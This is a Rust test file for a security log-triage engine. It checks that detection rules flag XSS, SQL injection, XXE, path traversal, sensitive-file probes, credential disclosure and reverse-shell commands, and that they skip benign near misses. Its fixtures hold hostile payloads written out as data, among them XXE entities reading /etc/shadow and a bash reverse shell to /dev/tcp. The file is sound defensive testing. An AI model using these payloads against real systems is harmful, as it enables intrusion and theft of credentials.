use crate::{
    detections::{self, Settings, Source, Triage},
    model::Event,
};
use serde_json::{json, Value};

fn event(id: usize, seconds: i64, fields: Value) -> Event {
    let mut e = Event::empty();
    e.id = id;
    e.timestamp = Some(1_700_000_000_000 + seconds * 1000);
    e.source = "contract-test".into();
    e.fields = fields.as_object().unwrap().clone();
    e
}
fn process(id: usize, seconds: i64, command: &str) -> Event {
    event(
        id,
        seconds,
        json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.entity_id":format!("p{id}"),"process.command_line":command}),
    )
}
fn run(events: &[Event]) -> Triage {
    let rules = detections::builtin_ruleset().unwrap();
    let settings = Settings { threats: false, ..Default::default() };
    detections::run(
        &detections::Inputs { rules: &rules, settings: &settings, catalog: None },
        &Source::Events(events.iter().collect()),
    )
    .unwrap()
}
fn contains(t: &Triage, rule: &str) -> bool {
    t.detections.iter().any(|d| d.rule == rule)
}

fn application_request(id: usize, seconds: i64, path: &str) -> Event {
    let mut e = event(id, seconds, json!({}));
    e.source = "org.springframework.web.servlet.PageNotFound".into();
    e.message = format!("No mapping found for HTTP request with URI [{path}] in DispatcherServlet with name 'dispatcher'");
    e.raw = e.message.clone();
    e
}
#[test]
fn content_application_log_paths_have_deliberate_levels_and_exact_excerpts() {
    for (path, rule, level) in [
        ("/geoserver/.bash_history", "sensitive_request", 3),
        ("/geoserver/mysqldump.sql", "backup_request", 2),
        ("/geoserver/id_rsa_1024", "sensitive_request", 3),
        ("/other/.ssh/id_ed25519", "sensitive_request", 3),
        ("/etc/passwd", "sensitive_request", 3),
        ("/etc/shadows", "sensitive_request", 3),
        ("/geoserver/.htpasswds", "sensitive_request", 3),
        ("/geoserver/.env.production", "ambiguous_request", 1),
        ("/download?file=../../application/startup.conf", "path_traversal", 3),
        ("/download?file=..%252f..%252fetc%252fpasswd", "traversal_request", 3),
    ] {
        let event = application_request(0, 0, path);
        let result = run(&[event.clone()]);
        let d = result.detections.iter().find(|d| d.rule == format!("content.{rule}")).unwrap_or_else(|| panic!("missing {rule} for {path}"));
        assert_eq!(d.evidence.evidence_level, level, "{path}");
        assert_eq!(d.evidence.outcome,"failure");
        assert_eq!(d.evidence.claim,"attempt");
        assert!(d.evidence.checks.iter().any(|c|c.status=="passed" && !c.event_refs.is_empty()));
        assert!(d.evidence.checks.iter().any(|c|c.status=="failed" && c.observed=="failure"));
        let x=&d.evidence.excerpts[0];
        assert_eq!(x.field,"message");
        if !path.contains('%') { assert_eq!(&event.message[x.start..x.end],x.matched); assert!(x.before.contains("URI")); }
    }
    for path in ["/index.html","/api/credentials","/assets/env.production.js","/images/id_rsa_1024.png","/help/etc/passwd.html","/user/password-reset","../styles/theme.css"] {
        assert!(run(&[application_request(0,0,path)]).detections.is_empty(),"benign near miss: {path}");
    }
}

#[test]
fn content_xxe_parser_denial_and_payload_do_not_assert_disclosure() {
    let raw="01:53:47,839 ERROR [org.geoserver.ows] (http-/0.0.0.0:443-26) : org.geoserver.platform.ServiceException: org.xml.sax.SAXException: Entity resolution disallowed for file:///etc/passwd\n\tat org.geoserver.wfs.kvp.FilterKvpParser.parseXMLFilterWithOldParser(FilterKvpParser.java:145)";
    let e=crate::sources::parse_line(raw.as_bytes(),"wildfly",None,&[]);
    let result=run(&[e]);
    let d=result.detections.iter().find(|d|d.rule=="content.xxe_blocked").expect("XML parser diagnosis");
    assert_eq!((d.evidence.evidence_level,d.evidence.claim.as_str(),d.evidence.outcome.as_str()),(4,"attempt","blocked"));
    assert!(!result.detections.iter().any(|d|d.evidence.claim=="effect"||d.rule.contains("disclosure")));
    let payload=r#"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><Filter><PropertyIsEqual"#;
    let mut e=event(0,0,json!({}));e.message=payload.into();
    assert_eq!(run(&[e.clone()]).detections.iter().find(|d|d.rule=="content.xxe_payload").unwrap().evidence.evidence_level,3);
    e.fields.insert("http.request.body.content".into(),json!(payload));e.message.clear();
    assert_eq!(run(&[e.clone()]).detections.iter().find(|d|d.rule=="content.xxe_request").unwrap().evidence.evidence_level,4);
    for benign in [r#"<!DOCTYPE note SYSTEM "https://example.org/note.dtd">"#,r#"<!ENTITY app SYSTEM "file:///app/schema.dtd">"#,"Entity resolution disallowed for https://example.org/schema.dtd"] {
        e.fields.clear();e.message=benign.into();assert!(run(&[e.clone()]).detections.is_empty(),"{benign}");
    }
    e.fields.insert("event.kind".into(),json!("documentation"));e.message=payload.into();
    assert!(run(&[e]).detections.is_empty());
}

#[test]
fn content_request_payloads_are_not_inconclusive_or_sql_errors() {
    for (path, rule) in [
        ("/search=<script>alert('XSS')</script>","xss_request"),
        ("/?q=%3Cimg%20src=x%20onerror=alert(1)%3E","xss_request"),
        ("/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--","sqli_request"),
        ("/?id=' OR 1=1--","sqli_request"),
        ("/?id=1%27+OR+%271%27=%271%27--","sqli_request"),
        ("/?id='; SELECT pg_sleep(5)--","sqli_request"),
    ] {
        let r=run(&[application_request(0,0,path)]);
        let d=r.detections.iter().find(|d|d.rule==format!("content.{rule}")).unwrap_or_else(||panic!("missing {path}"));
        assert_eq!(d.evidence.evidence_level,3);
        assert_eq!(d.evidence.outcome,"failure");
    }
    for path in ["/?q=select+product","/?q=You+have+an+error+in+your+SQL+syntax","/js/application.js","/?id=' OR 1=2--"] {
        assert!(run(&[application_request(0,0,path)]).detections.is_empty(),"{path}");
    }
    let mut docs=application_request(0,0,"/?q=<script>alert(1)</script>");
    docs.message=format!("Example: {}",docs.message);
    assert!(run(&[docs]).detections.is_empty());
}

#[test]
fn content_probe_correlation_counts_families_and_scopes_not_retries() {
    let paths=["/app/.env.old","/app/id_rsa_3072","/app/mysqldump.sql"];
    let events:Vec<_>=paths.iter().enumerate().map(|(id,path)|application_request(id,id as i64,path)).collect();
    let result=run(&events);
    let d=result.detections.iter().find(|d|d.rule=="content.sensitive_probe_set").expect("three distinct families");
    assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.distinct,3);assert_eq!(d.event_ids,vec![0,1,2]);
    assert_eq!(result.detections.iter().find(|d|d.rule=="content.ambiguous_request").unwrap().evidence.evidence_level,1);
    for field in ["source.ip","host.name","service.name","cloud.account.id","caminho"] {
        let changed:Vec<_>=events.iter().enumerate().map(|(i,e)|{let mut e=e.clone();e.fields.insert(field.into(),json!(format!("different-{i}")));e}).collect();
        assert!(!contains(&run(&changed),"content.sensitive_probe_set"),"{field}");
    }
    let mut outside=events.clone();outside[2].timestamp=outside[0].timestamp.map(|t|t+600001);
    assert!(!contains(&run(&outside),"content.sensitive_probe_set"));
    let retry:Vec<_>=["/.env.old","/.env.production","/.env.local","/.env.bak"].iter().enumerate().map(|(i,p)|application_request(i,i as i64,p)).collect();
    assert!(!contains(&run(&retry),"content.sensitive_probe_set"));
    let no_time:Vec<_>=events.iter().cloned().map(|mut e|{e.timestamp=None;e}).collect();
    assert!(!contains(&run(&no_time),"content.sensitive_probe_set"));
}

#[test]
fn content_xxe_target_boundaries_and_config_ambiguity() {
    for payload in [r#"<!ENTITY x SYSTEM "file:///etc/passwd.html">"#,r#"<!ENTITY x SYSTEM "http://localhost.example.org/schema">"#,
        "Entity resolution disallowed for file:///etc/passwd.html",r#"<!ENTITY x SYSTEM "php://filter/resource=/app/schema.dtd">"#] {
        let mut e=event(0,0,json!({}));e.message=payload.into();
        assert!(run(&[e]).detections.is_empty(),"{payload}");
    }
    let r=run(&[application_request(0,0,"/app/config/config.dev.yml")]);
    assert_eq!(r.detections.iter().find(|d|d.rule=="content.ambiguous_request").unwrap().evidence.evidence_level,1);
}

#[test]
fn content_any_original_field_nested_array_and_raw_keep_provenance() {
    let payload=r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#;
    for (fields, message, raw, expected) in [
        (json!({"vendorBlob":payload}),"","","vendorBlob"),
        (json!({"opaque":{"chunks":[{"value":payload}]}}),"","","opaque.chunks.0.value"),
        (json!({}),"",payload,"raw"),
        (json!({}),payload,"","message"),
    ] {
        let mut e=event(0,0,fields);e.message=message.into();e.raw=raw.into();
        let result=run(&[e]);let d=result.detections.iter().find(|d|d.rule=="content.xxe_payload").unwrap();
        assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.evidence.claim,"activity");
        assert_eq!(d.evidence.excerpts[0].field,expected);
    }
    let line="No mapping found for HTTP request with URI [/other/id_rsa_4096] in dispatcher";
    let e=event(0,0,json!({"original":{"unexpected":line}}));
    let r=run(&[e]);let d=r.detections.iter().find(|d|d.rule=="content.sensitive_request").unwrap();
    assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.evidence.excerpts[0].field,"original.unexpected");
    assert_eq!(&line[d.evidence.excerpts[0].start..d.evidence.excerpts[0].end],d.evidence.excerpts[0].matched);
    for (text,rule,level) in [("<script>alert('XSS')</script>","xss_payload",2),
        ("%3Cscript%3Ealert(1)%3C/script%3E","xss_payload",2),("' OR 1=1--","sqli_payload",2),
        ("../../etc/passwd","traversal_payload",3),("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1","reverse_payload",4)] {
        let e=event(0,0,json!({"opaque":{"items":[text]}}));
        let result=run(&[e]);let d=result.detections.iter().find(|d|d.rule==format!("content.{rule}")).unwrap_or_else(||panic!("{rule}"));
        assert_eq!(d.evidence.evidence_level,level);assert_eq!(d.evidence.excerpts[0].field,"opaque.items.0");
    }
}

#[test]
fn content_generic_scan_keeps_boundaries_and_does_not_use_enrichment() {
    for fields in [json!({"a":"<!ENTITY xxe SYSTEM ","b":"file:///etc/passwd"}),
        json!({"a":"<script>","b":"alert(1)</script>"}),
        json!({"a":"' OR 1=", "b":"1--"}),
        json!({"query":"SELECT a FROM users UNION SELECT a FROM archived_users"}),
        json!({"opaque":"Documentation: <script>alert(1)</script>"}),
        json!({"_sec.content.xxe_request":"true"})] {
        assert!(run(&[event(0,0,fields.clone())]).detections.is_empty(),"{fields}");
    }
    let mut e=event(0,0,json!({}));e.name="<script>alert(1)</script>".into();e.description="' OR 1=1--".into();
    assert!(run(&[e]).detections.is_empty());
    let e=event(0,0,json!({"opaque":{"first":"<script>alert(1)</script>","copy":"<script>alert(1)</script>"}}));
    let r=run(&[e]);let ds:Vec<_>=r.detections.iter().filter(|d|d.rule=="content.xss_payload").collect();
    assert_eq!(ds.len(),1);assert_eq!(ds[0].evidence.evidence_level,2);assert_eq!(ds[0].evidence.excerpts.len(),1);
    let fields:serde_json::Map<_,_>=(0..140).map(|i|(format!("field-{i:03}"),json!("value"))).collect();
    let (_,normalized)=crate::security_normalize::normalize(&event(0,0,Value::Object(fields)),&[]);
    assert!(normalized.content_clipped);assert!(!normalized.limitations.is_empty());
}

#[test]
fn content_catalog_parity_does_not_promote_normal_sql_or_returned_scripts() {
    let rules=detections::builtin_ruleset().unwrap();let catalog=crate::threats::builtin_catalog();let settings=Settings::default();
    let input=detections::Inputs {rules:&rules,catalog:Some(&catalog),settings:&settings};
    for fields in [json!({"sql":"SELECT name FROM users UNION SELECT name FROM old_users"}),
        json!({"http.response.body.content":"<script>alert(1)</script>"}),
        json!({"opaque":"echo '<script>alert(1)</script>'"}),
        json!({"opaque":"Documentation: <script>alert(1)</script>"}),
        json!({"opaque":"echo '<script>alert(1)</script>'","event.kind":"documentation"}),
        json!({"response":{"body":"No mapping found for HTTP request with URI [/etc/passwd] in dispatcher"}})] {
        let e=event(0,0,fields.clone());let r=detections::run(&input,&Source::Events(vec![&e])).unwrap();
        assert!(r.detections.is_empty(),"legitimate/context-only: {fields}: {:?}",r.detections.iter().map(|d|&d.rule).collect::<Vec<_>>());
    }
    let e=application_request(0,0,"/?q=<script>alert(1)</script>");
    let r=detections::run(&input,&Source::Events(vec![&e])).unwrap();
    assert!(r.detections.iter().any(|d|d.rule=="content.xss_request"&&d.evidence.evidence_level==3));
    assert!(!r.detections.iter().any(|d|d.signal_rules.iter().any(|r|r.starts_with("web.xss."))));
}
fn web_content(id: usize, path: &str, body: &str) -> Event {
    event(
        id,
        id as i64,
        json!({"event.category":"web","event.action":"http_request","host.name":"web-a","url.original":path,"http.response.body.content":body,"http.response.status_code":200}),
    )
}
const PASSWD_CONTENT: &str =
    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";

#[test]
fn content_request_and_response_are_distinct_and_highlight_original_fields() {
    let e = web_content(0, "/download?file=../../etc/passwd", PASSWD_CONTENT);
    let result = run(&[e]);
    for (rule, level) in [
        ("sensitive_request", 3),
        ("traversal_request", 3),
        ("passwd_response", 4),
        ("passwd_disclosure", 5),
    ] {
        let d = result
            .detections
            .iter()
            .find(|d| d.rule == format!("content.{rule}"))
            .unwrap_or_else(|| panic!("missing {rule}"));
        assert_eq!(d.evidence.evidence_level, level, "{rule}");
        assert!(!d.evidence.excerpts.is_empty());
        assert!(d
            .evidence
            .excerpts
            .iter()
            .all(|x| x.event_ref == d.evidence.event_refs[0]));
    }
    let d = result
        .detections
        .iter()
        .find(|d| d.rule == "content.passwd_disclosure")
        .unwrap();
    assert!(d
        .evidence
        .excerpts
        .iter()
        .any(|x| x.field == "http.response.body.content" && x.matched.starts_with("root:x:0:0:")));
    assert!(d
        .evidence
        .excerpts
        .iter()
        .any(|x| x.field == "url.original"));
    let attempt = run(&[web_content(0, "/?file=..%252f..%252fetc%252fpasswd", "")]);
    assert!(contains(&attempt, "content.traversal_request"));
    assert!(!contains(&attempt, "content.passwd_disclosure"));
    assert!(attempt
        .detections
        .iter()
        .filter(|d| d.rule.starts_with("content."))
        .flat_map(|d| &d.evidence.excerpts)
        .any(|x| x.transformation.contains("percent")));
}

#[test]
fn content_excludes_denials_reflection_documentation_and_cross_event_bodies() {
    let base = web_content(0, "/../../etc/passwd", PASSWD_CONTENT);
    for (key, value) in [
        ("event.outcome", json!("blocked")),
        ("http.response.status_code", json!(403)),
        ("event.kind", json!("documentation")),
        ("http.request.body.content", json!(PASSWD_CONTENT)),
    ] {
        let mut e = base.clone();
        e.fields.insert(key.into(), value);
        let r = run(&[e]);
        assert!(!contains(&r, "content.passwd_response"), "{key}");
        assert!(!contains(&r, "content.passwd_disclosure"));
    }
    for body in ["File not found: /etc/passwd","root:x:0:0:root:/root:/bin/bash", "<pre>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</pre>"] {
        assert!(!contains(&run(&[web_content(0,"/etc/passwd",body)]),"content.passwd_response"));
    }
    let mut quoted = event(
        0,
        0,
        json!({"description":PASSWD_CONTENT,"comment":"cat /etc/shadow"}),
    );
    quoted.message = PASSWD_CONTENT.into();
    assert!(run(&[quoted])
        .detections
        .iter()
        .all(|d| !d.rule.starts_with("content.")));
    let r = run(&[
        web_content(0, "/etc/passwd", ""),
        web_content(1, "/normal", PASSWD_CONTENT),
    ]);
    assert!(
        !contains(&r, "content.passwd_disclosure"),
        "Different events are not linked by proximity or host"
    );
}

#[test]
fn content_read_commands_require_sensitive_target_and_keep_admin_ambiguity() {
    assert!(!contains(
        &run(&[process(0, 0, "cat /var/log/application.log")]),
        "content.sensitive_read"
    ));
    assert!(!contains(
        &run(&[process(0, 0, "echo 'cat /etc/shadow'")]),
        "content.sensitive_read"
    ));
    let e = process(0, 0, "cat /etc/passwd");
    let r = run(&[e.clone()]);
    let d = r
        .detections
        .iter()
        .find(|d| d.rule == "content.sensitive_read")
        .unwrap();
    assert_eq!(d.evidence.evidence_level, 1);
    let mut e = e;
    e.fields
        .insert("process.parent.name".into(), json!("nginx"));
    assert!(contains(&run(&[e]), "content.web_process_read"));
    assert!(contains(
        &run(&[web_content(0, "/api?cmd=cat%20%2fetc%2fshadow", "")]),
        "content.read_request"
    ));
}

#[test]
fn content_shadow_private_keys_and_configuration_need_coherent_structures() {
    let shadow = format!("root:$6$testsalt${}:20000:0:99999:7:::", "a".repeat(86));
    assert!(contains(
        &run(&[web_content(0, "/etc/shadow", &shadow)]),
        "content.shadow_disclosure"
    ));
    for body in [
        "root:!:20000:0:99999:7:::",
        "root:$6$short:20000:0:99999:7:::",
    ] {
        assert!(!contains(
            &run(&[web_content(0, "/etc/shadow", body)]),
            "content.shadow_response"
        ));
    }
    let pem="-----BEGIN RSA PRIVATE KEY-----\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd\n-----END RSA PRIVATE KEY-----";
    assert!(contains(
        &run(&[web_content(0, "/.ssh/id_rsa", pem)]),
        "content.private_key_disclosure"
    ));
    assert!(!contains(
        &run(&[web_content(
            0,
            "/.ssh/id_rsa",
            &pem.replace("END RSA", "END EC")
        )]),
        "content.private_key_response"
    ));
    let config = "DB_HOST=database.internal\nDB_PASSWORD=fixture-value-123456";
    assert!(contains(
        &run(&[web_content(0, "/.env", config)]),
        "content.secrets_disclosure"
    ));
    assert!(!contains(
        &run(&[web_content(
            0,
            "/.env",
            "DB_HOST=database.internal\nDB_PASSWORD=changeme"
        )]),
        "content.secrets_response"
    ));
    assert!(!contains(
        &run(&[web_content(0, "/.env", "DB_PASSWORD=fixture-value-123456")]),
        "content.secrets_response"
    ));
}

#[test]
fn content_excerpts_are_utf8_bounded_and_reverse_shell_has_real_command() {
    let text = format!("{}cat /etc/shadow{}", "é".repeat(1000), "🦀".repeat(1000));
    let x = crate::evidence::Excerpt::new("r", "f", "original", &text, 2000, 2015).unwrap();
    assert_eq!(
        x.matched,
        "cat /etc/shadow🦀".get(..15).unwrap_or("cat /etc/shadow")
    );
    assert!(x.prefix_omitted && x.suffix_omitted);
    let r = run(&[process(0, 0, "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1")]);
    let d = r
        .detections
        .iter()
        .find(|d| d.rule == "attempt.reverse-shell.process")
        .unwrap();
    assert!(d
        .evidence
        .excerpts
        .iter()
        .any(|x| x.matched.contains("/dev/tcp/192.0.2.10/4444")));
    assert!(d
        .evidence
        .excerpts
        .iter()
        .all(|x| !x.field.starts_with("_sec.")));
}

#[test]
fn content_separate_responses_require_exact_scoped_request_and_chronology() {
    let mut a = web_content(0, "/../../etc/passwd", "");
    let mut b = web_content(1, "/normal", PASSWD_CONTENT);
    for e in [&mut a, &mut b] {
        e.fields.insert("http.request.id".into(), json!("r-1"));
        e.fields.insert("service.name".into(), json!("files"));
        e.fields.insert(
            "@timestamp".into(),
            json!(
                chrono::DateTime::from_timestamp_millis(e.timestamp.unwrap())
                    .unwrap()
                    .to_rfc3339()
            ),
        );
    }
    let r = run(&[a.clone(), b.clone()]);
    let d = r
        .detections
        .iter()
        .find(|d| d.rule == "content.passwd_linked_response")
        .unwrap();
    assert_eq!(d.evidence.evidence_level, 5);
    assert_eq!(d.evidence.event_refs.len(), 2);
    for (key, v) in [
        ("http.request.id", "r-2"),
        ("host.name", "web-b"),
        ("service.name", "other"),
        ("cloud.account.id", "another-tenant"),
    ] {
        let mut different = b.clone();
        different.fields.insert(key.into(), json!(v));
        assert!(
            !contains(
                &run(&[a.clone(), different]),
                "content.passwd_linked_response"
            ),
            "{key}"
        );
    }
    let mut missing = b.clone();
    missing.fields.remove("http.request.id");
    assert!(!contains(
        &run(&[a.clone(), missing]),
        "content.passwd_linked_response"
    ));
    let mut late = b.clone();
    late.timestamp = a.timestamp.map(|t| t + 300_001);
    late.fields.insert(
        "@timestamp".into(),
        json!(
            chrono::DateTime::from_timestamp_millis(late.timestamp.unwrap())
                .unwrap()
                .to_rfc3339()
        ),
    );
    assert!(!contains(
        &run(&[a.clone(), late]),
        "content.passwd_linked_response"
    ));
    let mut same = b.clone();
    same.timestamp = a.timestamp;
    same.fields
        .insert("@timestamp".into(), a.fields["@timestamp"].clone());
    assert!(run(&[a.clone(), same])
        .detections
        .iter()
        .filter(|d| d.rule == "content.passwd_linked_response")
        .all(|d| d.evidence.evidence_level <= 3));
    a.fields.insert("event.outcome".into(), json!("blocked"));
    assert!(!contains(&run(&[a, b]), "content.passwd_linked_response"));
}

#[test]
fn content_original_event_lookup_checks_analysis_and_membership() {
    let state = crate::AppState {
        source: parking_lot::RwLock::new(crate::SourceData::None),
        source_names: parking_lot::RwLock::new(vec![]),
        codes: parking_lot::RwLock::new(Default::default()),
        system_codes: parking_lot::RwLock::new(Default::default()),
        derived: parking_lot::RwLock::new(vec![]),
        case_store_lock: parking_lot::Mutex::new(()),
        codes_path: Default::default(),
        system_codes_path: Default::default(),
    };
    let original = web_content(0, "/etc/passwd", PASSWD_CONTENT);
    let events = vec![original.clone()];
    let full = crate::triage::stored_analysis(&state, Some(&events), false).unwrap();
    let id = full.metadata["analysis_id"].as_str().unwrap();
    let reference = crate::security_normalize::event_ref(&original);
    let fetched =
        crate::triage::evidence_event_impl(&state, id, &reference, 0, Some(&events)).unwrap();
    assert_eq!(fetched.fields, original.fields);
    assert!(
        crate::triage::evidence_event_impl(&state, "stale", &reference, 0, Some(&events)).is_err()
    );
    assert!(
        crate::triage::evidence_event_impl(&state, id, "another-event", 0, Some(&events)).is_err()
    );
    assert!(crate::triage::evidence_event_impl(&state, id, &reference, 99, Some(&events)).is_err());
}

#[test]
fn content_custom_source_mapping_and_size_limits_are_explicit() {
    let e = event(
        0,
        0,
        json!({"operation":"web-access","target_uri":"/etc/passwd","returned":PASSWD_CONTENT}),
    );
    let mapping = crate::security_normalize::SourceMapping {
        source: e.source.clone(),
        fields: std::collections::BTreeMap::from([
            ("action".into(), "operation".into()),
            ("url".into(), "target_uri".into()),
            ("response_body".into(), "returned".into()),
        ]),
        actions: std::collections::BTreeMap::from([("web-access".into(), "http_request".into())]),
        ..Default::default()
    };
    crate::security_normalize::validate_mappings(&[mapping.clone()]).unwrap();
    let (view, n) = crate::security_normalize::normalize(&e, &[mapping]);
    assert_eq!(view.fields["_sec.content.passwd_disclosure"], "true");
    assert!(n.signals.iter().any(|s| s.excerpt.field == "returned"));
    let long = web_content(
        0,
        "/etc/passwd",
        &format!("{PASSWD_CONTENT}\n{}", " ".repeat(100_000)),
    );
    let result = run(&[long]);
    assert!(result.limited);
    assert!(result
        .limitations
        .iter()
        .any(|s| s.contains("textual parcial")));
    let d = result
        .detections
        .iter()
        .find(|d| d.rule == "content.passwd_disclosure")
        .unwrap();
    assert!(d.evidence.evidence_level <= 3);
    assert!(d
        .evidence
        .missing_evidence
        .iter()
        .any(|s| s.contains("64 KiB")));
}
fn custom(rule: Value, events: &[Event], settings: &Settings) -> Triage {
    let rules = detections::test_ruleset(vec![serde_json::from_value(rule).unwrap()], vec![]).unwrap();
    detections::run(
        &detections::Inputs { rules: &rules, settings, catalog: None },
        &Source::Events(events.iter().collect()),
    )
    .unwrap()
}

#[test]
fn security_ratio_and_numeric_aggregates_use_full_denominator() {
    let ratio = json!({"id":"ratio-test","name":"Proporção em autenticação direcionada","severity":"high","kind":"ratio","where":"_sec.action:logon","by":["_sec.host"],"window":"5m","count":4,"ratio":{"numerator":"_sec.outcome:failure","gte":0.75},"evidence":{"level":2,"rationale":"Falhas predominantes no contexto declarado","maturity":"experimental"}});
    let mut events:Vec<_>=(0..4).map(|i|event(i,i as i64,json!({"event.category":"authentication","event.action":"logon","event.outcome":if i<3{"failure"}else{"success"},"host.name":"h"}))).collect();
    let settings = Settings { threats: false, ..Default::default() };
    let r = custom(ratio.clone(), &events, &settings);
    assert_eq!(r.detections[0].measurements["numerator"], 3);
    assert_eq!(r.detections[0].measurements["denominator"], 4);
    events[0].fields.insert("event.outcome".into(), json!("success"));
    assert!(custom(ratio.clone(), &events, &settings).detections.is_empty());
    events[0].fields.insert("event.outcome".into(), json!("failure"));
    events[3].timestamp = events[0].timestamp.map(|t| t + 300001);
    assert!(custom(ratio.clone(), &events, &settings).detections.is_empty());
    let boundary = (events[0].timestamp.unwrap().div_euclid(300000) + 1) * 300000;
    let mut straddled = Vec::new();
    for i in 0..14 {
        let mut e = events[0].clone();
        e.id = i;
        e.timestamp = Some(boundary + i as i64 - 10);
        e.fields.insert("event.outcome".into(), json!(if i < 10 { "success" } else { "failure" }));
        straddled.push(e);
    }
    assert!(
        custom(ratio.clone(), &straddled, &settings).detections.is_empty(),
        "Partition boundary must retain successful events in denominator"
    );
    for e in &mut straddled {
        e.timestamp = Some(boundary);
    }
    assert!(
        custom(ratio, &straddled, &settings).detections.is_empty(),
        "Equal timestamps cannot be evaluated using an arbitrary prefix"
    );
    let aggregate = json!({"id":"aggregate-test","name":"Volume em transferência sensível","severity":"high","kind":"aggregate","where":"_sec.action:object_transfer","by":["_sec.host"],"window":"5m","count":2,"aggregate":{"field":"bytes","operation":"sum","gte":100},"evidence":{"level":2,"rationale":"Transferência previamente selecionada como sensível","maturity":"experimental"}});
    let events = vec![
        event(0, 0, json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":40})),
        event(1, 1, json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":60})),
    ];
    let r = custom(aggregate.clone(), &events, &settings);
    assert_eq!(r.detections[0].measurements["value"], 100.0);
    let mut average = aggregate.clone();
    average["aggregate"] = json!({"field":"bytes","operation":"avg","gte":10});
    let averages: Vec<_> = [10, 10, -100, 100, 10, 10]
        .iter()
        .enumerate()
        .map(|(i, n)| {
            let mut e = events[0].clone();
            e.id = i;
            e.timestamp = e.timestamp.map(|t| t + i as i64);
            e.fields.insert("bytes".into(), json!(n));
            e
        })
        .collect();
    assert_eq!(
        custom(average, &averages, &settings).detections.len(),
        1,
        "Do not reset the denominator after emitting a finding"
    );
    let mut missing = events;
    missing[0].fields.remove("bytes");
    assert!(custom(aggregate, &missing, &settings).detections.is_empty());
}

#[test]
fn security_absence_requires_complete_explicit_source_coverage() {
    let rule = json!({"id":"absence-test","name":"Operação suspeita sem evento esperado","severity":"medium","kind":"absence","by":["_sec.host"],"window":"5m","coverage":"process","steps":[{"where":"phase:anchor"},{"where":"phase:expected"}],"evidence":{"level":2,"rationale":"Âncora suspeita explicitamente selecionada","maturity":"experimental"}});
    let mut anchor = process(0, 0, "whoami");
    anchor.fields.insert("phase".into(), json!("anchor"));
    let mut settings = Settings { threats: false, ..Default::default() };
    assert!(custom(rule.clone(), &[anchor.clone()], &settings).detections.is_empty());
    let fingerprint = custom(rule.clone(), &[anchor.clone()], &settings).dataset_fingerprint;
    settings.coverage.push(detections::CoverageWindow {
        dataset_fingerprint: fingerprint,
        source: anchor.source.clone(),
        namespace: "host:h".into(),
        category: "process".into(),
        start: anchor.timestamp.unwrap(),
        end: anchor.timestamp.unwrap() + 300000,
        complete: true,
        justification: "Intervalo integral exportado do sensor".into(),
    });
    let r = custom(rule.clone(), &[anchor.clone()], &settings);
    assert_eq!(r.detections.len(), 1);
    assert_eq!(r.detections[0].measurements["expected_events"], 0);
    let mut expected = process(1, 300, "whoami");
    expected.fields.insert("phase".into(), json!("expected"));
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
    assert!(custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings).detections.is_empty());
    expected.timestamp = None;
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
    assert!(custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings).detections.is_empty());
    expected.fields.remove("host.name");
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
    assert!(
        custom(rule.clone(), &[anchor.clone(), expected], &settings).detections.is_empty(),
        "Unjoinable expected event prevents an absence claim"
    );
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone()], &Settings::default()).dataset_fingerprint;
    settings.coverage[0].end -= 1;
    assert!(custom(rule.clone(), &[anchor.clone()], &settings).detections.is_empty());
    settings.coverage[0].end += 1;
    settings.coverage[0].source = "another-source".into();
    assert!(custom(rule, &[anchor], &settings).detections.is_empty());
}

#[test]
fn security_disk_pages_preserve_levels_members_and_universe() {
    let events = chains().remove(0).1;
    let rules = detections::builtin_ruleset().unwrap();
    let settings = Settings { threats: false, ..Default::default() };
    let inputs = detections::Inputs { rules: &rules, settings: &settings, catalog: None };
    let in_memory = detections::run(&inputs, &Source::Events(events.iter().collect())).unwrap();
    let stored = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
    let page = stored.page(1, 0, 1, None, None).unwrap();
    assert_eq!(page["counts_by_level"], json!(in_memory.counts_by_level));
    assert_eq!(page["analysis_id"], in_memory.analysis_id);
    for d in page["detections"].as_array().unwrap() {
        let original = in_memory.detections.iter().find(|x| x.id == d["id"]).unwrap();
        assert_eq!(d["evidence_level"], original.evidence.evidence_level);
        assert_eq!(d["event_refs"], json!(original.evidence.event_refs));
    }
    let id = page["episodes"][0]["id"].as_str().unwrap();
    assert!(in_memory.episodes.iter().any(|e| e.id == id));
    let mut all = Vec::new();
    let mut offset = 0;
    loop {
        let p = stored.episode_members(id, offset, 1).unwrap();
        all.extend(p["detections"].as_array().unwrap().clone());
        match p["next_offset"].as_u64() {
            Some(n) => offset = n as usize,
            None => break,
        }
    }
    assert_eq!(all.len(), page["episodes"][0]["detection_count"].as_u64().unwrap() as usize);
    let mut related = std::iter::once(events[1].id);
    let narrow = stored.page(5, 0, 1, Some(&mut related), None).unwrap();
    assert_eq!(narrow["analysis_id"], page["analysis_id"]);
    assert_eq!(narrow["episodes"][0]["id"], page["episodes"][0]["id"]);
}

#[test]
fn security_pattern_groups_preserve_all_occurrences_before_paging() {
    let events: Vec<_> = (0..205).map(|id| {
        let mut e = event(id, id as i64, json!({"source.ip":"192.0.2.8","service.name":"geo","arbitrary":{"text":format!(
